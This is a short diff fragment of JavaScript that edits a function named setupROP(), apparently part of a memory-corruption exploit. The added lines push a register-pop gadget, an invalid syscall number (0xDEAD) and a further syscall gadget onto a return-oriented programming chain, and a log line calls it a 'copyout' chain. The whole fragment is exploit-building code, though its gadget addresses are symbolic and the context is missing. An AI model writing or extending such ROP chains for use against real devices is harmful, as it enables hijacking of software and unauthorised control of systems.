@@ -33,7 +33,10 @@ function setupROP() {
 
   // syscall
   ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
+  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
+  ropChain[i++] = 0xDEAD; // Invalid syscall
 
+  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
   debug_log(\"ROP chain (copyout) initialized.\");
   return ropChain;
 }
